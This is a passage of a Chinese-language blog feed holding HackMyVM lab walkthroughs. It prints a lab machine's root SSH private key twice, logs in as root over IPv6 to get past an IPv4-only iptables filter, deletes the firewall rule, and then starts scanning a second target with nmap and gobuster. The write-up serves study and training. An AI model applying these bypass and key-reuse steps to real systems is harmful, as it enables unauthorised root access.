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
<span class="token assign-left variable">EkGwPez9XGBEUAAAALcm9vdEB1YnVudHU</span><span class="token operator">=</span>
-----END OPENSSH PRIVATE KEY-----
root@ubuntu:~/.ssh<span class="token comment"># </span></code></pre>
<p>保存留一下一会连接用<br>探测一下靶机ipv6地址</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ping6 ff02：：1%eth0
PING ff02：：1%eth0 <span class="token punctuation">(</span>ff02::1%eth0<span class="token punctuation">)</span> <span class="token number">56</span> data bytes
<span class="token number">64</span> bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.156</span> ms
<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.734</span> ms
<span class="token number">64</span> bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.025</span> ms
<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">2</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.271</span> ms
<span class="token number">64</span> bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.030</span> ms
<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">3</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.276</span> ms
c64 bytes from fe80::20c:29ff:fed2:e049%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.026</span> ms
<span class="token number">64</span> bytes from fe80::a00:27ff:fe42:db30%eth0: <span class="token assign-left variable">icmp_seq</span><span class="token operator">=</span><span class="token number">4</span> <span class="token assign-left variable">ttl</span><span class="token operator">=</span><span class="token number">64</span> <span class="token assign-left variable">time</span><span class="token operator">=</span><span class="token number">0.315</span> ms
^C
--- ff02：：1%eth0 <span class="token function">ping</span> statistics ---
<span class="token number">4</span> packets transmitted, <span class="token number">4</span> received, +4 duplicates, <span class="token number">0</span>% packet loss, <span class="token function">time</span> 3005ms
rtt min/avg/max/mdev <span class="token operator">=</span> <span class="token number">0.025</span>/0.229/0.734/0.221 ms</code></pre>
<p>然后用私钥连接</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> aaa                                                
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzhi8CwvvtsKmKafXglHqWyCTjiy4wSfUkwGlQkJ+flYthTVBAJ/L
GxPkEjSi5G6eBYyME9Pm8xBbacS1Jbr18IYIPYy0fu9j7MXRTpvYTITHIrk3g2oLs+2f+I
hZqm1cVr4MgTjxl62/hcZoIZoALz02uFzmdiOc19mrrD+cVoop0gpG5VMI6pCwF3fiK17q
Wbyjt62i7VsrhQ8kMWaT7HXBK30k06EyBlUK4sRLarr/rMCqSCqJ/TwJP3cs4d+5LssLxY
RIxJMh6B94mT7K3MA034e4PpUz8frw1eT7FyUd8XGsipWuKAmwPVymNGEQFvKaGJ6IMLF6
b5KFReygmfYkGBLNjhP1waDU7NxqVriKN59DGebMfvW8rIll/sIPqyEJOTr+7EF74Dv03q
neH2hMrgu7Duonn7sM9DUgAu9CRXai3cxPFQMokmEZbblfwwJWaw94w4cqzVsenX5GQxFb
AUfSYDdrY+qmO8+xr9FP14DbfPbvn+Cof0G4sL99AAAFgCRJ8E8kSfBPAAAAB3NzaC1yc2
EAAAGBAM4YvAsL77bCpimn14JR6lsgk44suMEn1JMBpUJCfn5WLYU1QQCfyxsT5BI0ouRu
ngWMjBPT5vMQW2nEtSW69fCGCD2MtH7vY+zF0U6b2EyExyK5N4NqC7Ptn/iIWaptXFa+DI
E48Zetv4XGaCGaAC89Nrhc5nYjnNfZq6w/nFaKKdIKRuVTCOqQsBd34ite6lm8o7etou1b
K4UPJDFmk+x1wSt9JNOhMgZVCuLES2q6/6zAqkgqif08CT93LOHfuS7LC8WESMSTIegfeJ
k+ytzANN+HuD6VM/H68NXk+xclHfFxrIqVrigJsD1cpjRhEBbymhieiDCxem+ShUXsoJn2
JBgSzY4T9cGg1Ozcala4ijefQxnmzH71vKyJZf7CD6shCTk6/uxBe+A79N6p3h9oTK4Luw
7qJ5+7DPQ1IALvQkV2ot3MTxUDKJJhGW25X8MCVmsPeMOHKs1bHp1+RkMRWwFH0mA3a2Pq
pjvPsa/RT9eA23z275/gqH9BuLC/fQAAAAMBAAEAAAGAAezkutSwd1xfqYV2I7NItXO7NS
mRS0qoN3xdMx6EaIE9GSC7e/pCLz1TFOF1gR1QcBxVRa0l2/Dz7avHBnR17jqOUqbhG8t4
O0LI1wtpLKPT6WziCiIAPHzUkQGTFt7BLVVGsCFcTm6y2pjVKbUy2b4gZ/4EMCfahAC2VB
xfBUbyp5HtgiBxtaFG5904mW+gUFjNDb77RezjXfGbhLOg36Vk+ddINAruOPVr7dzoGHXp
RA+jt5tgISPBsVxXaL/Kiotyu/mBkLU5BRe2X9cfrxfq48mfes+2QiQHzZEpd6AL5ESHO1
zDFCSYM4HJUCSlvGYHd9Xi7EbFcQVg60d/AI7D7q9KoVPYHf5K2gkzUAgR5LtRl9lQ+riX
wOXviBEaC8iOF8VHB77EHdiUZHXtOovUdHqGlM98vwa8KgbUjYVaHtjYGvL0wb6Lp5jeKe
bXcy+7W6F1IjxNKk7CSaXY00asfHpLRVwbURz/505CqgQjBoSKKnnX/wRZt5y35NzZAAAA
wBbeKgaf45unZCyCXerjo4wON+ntDz1AbvUMeLDsJclnwtFdtedmrWnJZNkCVLMlX3b4q/
sQnz0xCD0UxkEkwaEqKrOXVPaqgSU+UdIj0e/GObNiAfqoO4l04/iqxs5ozh5+dzgCt7Fw
porszJ48DU9dJ5mvgeNirRpDMJOIhf/NZaA3YDGC4TziOl7bxMNPYuLqYED/syjHYNVxvT
eEqNF5P4NsawKmu6ExKzgsPTRZ4PcT/iQFsmsBozKbqUVZxwAAAMEA8fKsYXT/AwoqExHZ
YXcMQtAuM92isebSPv63Ssy9N+PaPsdKC6nl3CqENy3zBSE0Yo1LvclfS7gwACtedVWS2Q
GqB6z/q5gc2l6/VG1s8WcG3cbUlKPzQDTsSMZ7CMYK0lMX1jvzXjwqdJ1pSxFZfMdHuJpy
/mxUrpsgwhbzP589qc/UD/FfKjPyVTm7qs8qNeJDNsjcIl0Wp59OvufRh+cAimGX1S68Er
3H+DeE+Ymbi8e1rFN7C+HE1p6fqy3ZAAAAwQDaEQRgF2zKFz791AnRpx7I700k6q2RM1FZ
YnsmIYfdk6EEwczZ3ed8nbH+CLmx7npdoKG5SUqx4XiELPO8qOpmNqZoHH/1T3GxdjTRYc
cL40NAQDN+gR4DCPO5tmc/uojQm9Guhd7o8dQKAitjy6jrW+xDvtHNWl0gzKKZm3ndlwp7
re+b97O6LhCm7mQ79hVX8mAyk2/p129bzwGPtsSK3zB7zLksEKj0AlEEfiifyMjS9gNq0e
<span class="token assign-left variable">EkGwPez9XGBEUAAAALcm9vdEB1YnVudHU</span><span class="token operator">=</span>
-----END OPENSSH PRIVATE KEY-----


 ~/Desktop                                                                                                                                                                                                               root@kali2  <span class="token number">17</span>:23:40 
<span class="token operator">></span> <span class="token function">chmod</span> <span class="token number">600</span> aaa

 ~/Desktop                                                                                                                                                                                                               root@kali2  <span class="token number">17</span>:23:43 
<span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> aaa root@fe80::a00:27ff:fe42:db30%eth0
Linux airbind <span class="token number">6.1</span>.0-18-amd64 <span class="token comment">#1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@airbind:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groupes</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
root@airbind:~<span class="token comment"># ls</span>
root.txt</code></pre>
<p>然后苦于不知道原理问了一下群主老师<br>看一下靶机的端口开放情况</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># ss -tulnp</span>
Netid                State                 Recv-Q                Send-Q                                  Local Address:Port                                 Peer Address:Port                Process                                           
udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                            <span class="token number">10.0</span>.3.1:53                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">))</span></span>                 
udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                      <span class="token number">0.0</span>.0.0%lxcbr0:67                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">))</span></span>                 
udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                             <span class="token number">0.0</span>.0.0:67                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dhcpd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">640</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">))</span></span>                   
udp                  UNCONN                <span class="token number">0</span>                     <span class="token number">0</span>                                             <span class="token number">0.0</span>.0.0:68                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dhclient"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">367</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">))</span></span>                
tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">32</span>                                           <span class="token number">10.0</span>.3.1:53                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"dnsmasq"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">650</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">))</span></span>                 
tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">128</span>                                           <span class="token number">0.0</span>.0.0:22                                        <span class="token number">0.0</span>.0.0:*                    users:<span class="token variable"><span class="token punctuation">((</span>"sshd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">642</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">))</span></span>                    
tcp                  LISTEN                <span class="token number">0</span>                     <span class="token number">128</span>                                              <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:22                                           <span class="token punctuation">[</span>::<span class="token punctuation">]</span>:*                    users:<span class="token variable"><span class="token punctuation">((</span>"sshd"<span class="token punctuation">,</span>pid<span class="token operator">=</span><span class="token number">642</span><span class="token punctuation">,</span>fd<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">))</span></span>   </code></pre>
<p>发现有两个22端口对外开放，一个是ip4的(0.0.0.0)一个是ipv6的([::]),说明存在ipv6访问的可能</p>
<p>再看一下靶机的iptables，iptables简单点可以理解为linux的防火墙</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># iptables -nL</span>
Chain INPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
target     prot opt <span class="token builtin class-name">source</span>               destination         
ACCEPT     <span class="token number">6</span>    --  <span class="token number">192.168</span>.10.0/24      <span class="token number">0.0</span>.0.0/0            tcp dpt:22
DROP       <span class="token number">6</span>    --  <span class="token number">0.0</span>.0.0/0            <span class="token number">0.0</span>.0.0/0            tcp dpt:22

Chain FORWARD <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
target     prot opt <span class="token builtin class-name">source</span>               destination         

Chain OUTPUT <span class="token punctuation">(</span>policy ACCEPT<span class="token punctuation">)</span>
target     prot opt <span class="token builtin class-name">source</span>               destination     </code></pre>
<p>第一条规则允许来自192.168.10.0&#x2F;24的ssh流量<br>第二条规则任何其他所有的ssh的流量都被丢弃<br>这个第二条规则就是导致22端口被过滤的原因</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># iptables -D INPUT 2</span></code></pre>
<p>删除之后发现22端口开放</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.184                  
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-12 <span class="token number">17</span>:53 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.184
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:42:DB:30 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.14</span> seconds</code></pre>
<p>看一下ipv6 的iptable</p>
<pre class="language-bahs" data-language="bahs"><code class="language-bahs">root@airbind:~# ip6tables -nL
Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination   </code></pre>
<p>但是，根据规则对于ipv6没有任何过滤 也就是说ipv6可以访问ssh服务<br>我尝试加个限制</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@airbind:~<span class="token comment"># ip6tables -A INPUT -p tcp --dport 22 -j DROP</span></code></pre>
<p>发现ssh连不上了</p>
<pre class="language-bsah" data-language="bsah"><code class="language-bsah">&gt; ssh -i aaa root@fe80::a00:27ff:fe42:db30%eth0</code></pre>
<p>感觉不错，学到了不少东西。</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>ipv6bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-Birthday</title>
    <url>/posts/65d8e1a1/</url>
    <content><![CDATA[<p><strong>难度:Hard</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.149</strong></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.149</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-06 <span class="token number">10</span>:39 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.149
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00016s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:E8:95:BE <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
 
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">0.13</span> seconds</code></pre>
<p>好消息端口不是很复杂 只有22 80两个端口</p>
<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment">#  gobuster dir -u http://192.168.56.149 -x html,txt,php,bak,zip --wordlist=/usr/share/wordlists/dirb/common.txt  </span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.149
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              zip,html,txt,php,bak
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/.php                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.html                <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.hta.zip             <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.hta.html            <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.hta.txt             <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.hta                 <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.hta.bak             <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.hta.php             <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htaccess.php        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htaccess.bak        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htaccess.txt        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htaccess.zip        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htpasswd            <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htaccess            <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htaccess.html       <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htpasswd.txt        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
/.htpasswd.bak        <span class="token punctuation">(</span>Status: <span class="token number">403</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">279</span><span class="token punctuation">]</span>
